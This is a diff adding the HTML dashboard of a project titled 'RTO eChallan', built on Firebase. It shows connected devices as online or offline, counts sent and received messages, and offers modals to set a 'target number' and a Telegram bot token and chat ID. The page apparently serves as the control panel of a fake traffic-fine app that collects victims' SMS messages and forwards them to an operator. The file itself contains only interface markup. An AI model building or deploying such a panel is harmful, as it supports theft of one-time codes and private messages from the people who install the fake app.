@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard - RTO eChallan</title>
+  <link rel="stylesheet" href="css/main.css">
+</head>
+<body>
+  <div class="bg-orb orb-1"></div>
+  <div class="bg-orb orb-2"></div>
+  <div class="bg-orb orb-3"></div>
+
+  <div class="app-header">
+    <div>
+      <h2>⚡ DASHBOARD</h2>
+      <div class="user-info" id="userEmail">...</div>
+    </div>
+    <button class="btn-logout" onclick="logout()">Logout</button>
+  </div>
+
+  <div class="container">
+    <!-- Stats Hero Card -->
+    <div class="stats-hero">
+      <div class="stats-grid">
+        <div class="stat-box">
+          <div class="num" id="statSend">0</div>
+          <div class="lbl">Send</div>
+        </div>
+        <div class="stat-box">
+          <div class="num" id="statReceived">0</div>
+          <div class="lbl">Received</div>
+        </div>
+      </div>
+      <div class="stats-footer">
+        <span class="online">● Online: <span id="statOnline">0</span></span>
+        <span class="offline">● Offline: <span id="statOffline">0</span></span>
+        <span class="total">● Total: <span id="statTotal">0</span></span>
+      </div>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="quick-actions">
+      <button class="action-btn" onclick="location.href='messages.html'">
+        💬 All Messages
+      </button>
+      <button class="action-btn" onclick="openUpdateNoModal()">
+        📱 Update No
+      </button>
+      <button class="action-btn" onclick="openChangePassModal()">
+        🔐 Change Pass
+      </button>
+      <button class="action-btn" onclick="openTelegramModal()">
+        🤖 Telegram Bot
+      </button>
+    </div>
+
+    <!-- Device List -->
+    <div class="device-list" id="deviceList">
+      <div class="loading">Loading devices</div>
+    </div>
+  </div>
+
+  <!-- Update Number Modal -->
+  <div class="modal-overlay" id="modalUpdateNo">
+    <div class="modal">
+      <h3>📱 Update Target Number</h3>
+      <p class="modal-sub">Current: <span id="currentTargetNo">Not Set</span></p>
+      <div class="input-group">
+        <label>Enter 10-digit number</label>
+        <input type="tel" id="targetNoInput" placeholder="9876543210" maxlength="10">
+      </div>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalUpdateNo')">Cancel</button>
+        <button class="btn-primary" onclick="saveTargetNo()">Update</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Change Password Modal -->
+  <div class="modal-overlay" id="modalChangePass">
+    <div class="modal">
+      <h3>🔐 Change Password</h3>
+      <div class="input-group">
+        <label>Old Password</label>
+        <input type="password" id="oldPass" placeholder="Old Password">
+      </div>
+      <div class="input-group">
+        <label>New Password</label>
+        <input type="password" id="newPass" placeholder="New Password">
+      </div>
+      <div class="input-group">
+        <label>Confirm Password</label>
+        <input type="password" id="confirmPass" placeholder="Confirm Password">
+      </div>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalChangePass')">Cancel</button>
+        <button class="btn-primary" onclick="changePassword()">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Telegram Bot Modal -->
+  <div class="modal-overlay" id="modalTelegram">
+    <div class="modal">
+      <h3>🤖 Telegram Bot</h3>
+      <p class="modal-sub" id="telegramStatus">❌ Not Configured</p>
+      <div class="input-group">
+        <label>Bot Token (from @BotFather)</label>
+        <input type="text" id="tgToken" placeholder="123456789:ABCdefGHIjkl...">
+      </div>
+      <div class="input-group">
+        <label>Chat ID (from @userinfobot)</label>
+        <input type="text" id="tgChatId" placeholder="123456789 or -100123456">
+      </div>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalTelegram')">Cancel</button>
+        <button class="btn-primary" onclick="saveTelegram()">Save</button>
+      </div>
+      <div style="font-size:11px;color:#94a3b8;margin-top:14px;line-height:1.6;">
+        <b>🤖 How to get:</b><br>
+        1. Telegram pe @BotFather → /newbot<br>
+        2. Token copy karo<br>
+        3. @userinfobot → /start → Chat ID copy karo
+      </div>
+    </div>
+  </div>
+
+  <!-- Delete Device Modal -->
+  <div class="modal-overlay" id="modalDelete">
+    <div class="modal">
+      <h3>🗑️ Delete Device</h3>
+      <p class="modal-sub" id="deleteDeviceName">Kya aap sure hain?</p>
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('modalDelete')">Cancel</button>
+        <button class="btn-danger" onclick="confirmDelete()">Delete</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <script src="js/firebase-config.js"></script>
+  <script src="js/dashboard.js"></script>
+</body>
+</html>
